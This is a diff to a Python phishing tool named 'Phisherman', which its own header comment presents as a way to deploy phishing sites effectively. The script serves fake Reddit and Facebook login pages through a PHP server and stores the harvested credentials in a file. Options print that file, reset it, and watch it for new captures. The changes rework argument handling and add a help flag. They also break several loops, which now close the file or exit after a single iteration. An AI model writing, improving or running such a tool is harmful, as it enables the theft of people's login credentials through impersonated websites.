@@ -1,15 +1,10 @@
 #!/usr/bin/python3
+# A program that allows you to deploy phishing sites effectively.
+
 import os, sys, datetime, colorama, threading, subprocess
-
-default_payload = ''
-default_port = 8000
-
-payload = default_payload
-port = default_port
 
 root = "/usr/local/src/fish-src/"
 credentials = "{}credentials.txt".format(root)
-required = ['-w']
 
 directories = {
     'Reddit': "{}Reddit/".format(root),
@@ -17,16 +12,25 @@ directories = {
     'Facebook': "{}Facebook/".format(root)
 }
 
+DEFAULT_PAYLOAD = directories["Facebook"]
+DEFAULT_PORT = 8000
+
+payload = DEFAULT_PAYLOAD
+port = DEFAULT_PORT
+
 help_text = """Phisherman - Fake login client.
 Host fake login sites with the {}PHP{} server utility.{}
  -w | {}*{} Specify the website you would like to host.
  -p | {}*{} Specify the port you wish to host it upon.
  -c | {}*{} Print the contents of the credentials file.
- -r | {}*{} Reset the contents of the credentials file.""".format(
+ -r | {}*{} Reset the contents of the credentials file.
+ -h | {}*{} Prints this display of text.""".format(
     colorama.Fore.GREEN,
     colorama.Style.RESET_ALL,
     colorama.Fore.WHITE,
-    colorama.Fore.RED,
+    colorama.Fore.BLUE,
+    colorama.Fore.WHITE,
+    colorama.Fore.BLUE,
     colorama.Fore.WHITE,
     colorama.Fore.BLUE,
     colorama.Fore.WHITE,
@@ -38,6 +42,7 @@ Host fake login sites with the {}PHP{} server utility.{}
 
 def Response(text, code):
     notification_type = None
+
     match code:
         case 0:
             notification_type = colorama.Fore.RED
@@ -53,6 +58,7 @@ def Response(text, code):
         colorama.Fore.WHITE,
         text
     ))
+
     if notification_type == 0: sys.exit()
 
 def Help():
@@ -60,32 +66,27 @@ def Help():
     sys.exit()
 
 try:
-    joined = " ".join(sys.argv)
-    for alias in required:
-        if alias not in joined:
-            for i in range(0, len(sys.argv)):
-                match sys.argv[i]:
-                    case '-c':
-                        file = open(credentials, 'r')
-                        lines = file.readlines()
-                        for line in lines:
-                            print(line,end="")
-                        file.close()
-                        sys.exit()
-                    case '-r':
-                        open(credentials, 'w').close()
-                        sys.exit()
-                    case '-l':
-                        for directory in directories:
-                            Response("{}".format(directory), 2)
-                        sys.exit()
-            Help()
-            sys.exit()
-
-    selected = False
     for i in range(0, len(sys.argv)):
         match sys.argv[i]:
+            case '-c':
+                file = open(credentials, 'r')
+                lines = file.readlines()
+                
+                for line in lines:
+                    print(line,end="")
+                    file.close()
+                    sys.exit()
+            case '-r':
+                open(credentials, 'w').close()
+                sys.exit()
+            case '-l':
+                for directory in directories:
+                    Response("{}".format(directory), 2)
+                    sys.exit()
+            case '-h':
+                Help()
             case '-w':
+                selected = False
                 for directory in directories:
                     if sys.argv[i + 1].lower() == directory.lower():
                         payload = directories.get(directory)
@@ -120,6 +121,7 @@ try:
             return output
 
         previous_timestamp = os.path.getmtime(credentials)
+
         while True:
             current_timestamp = os.path.getmtime(credentials)
 
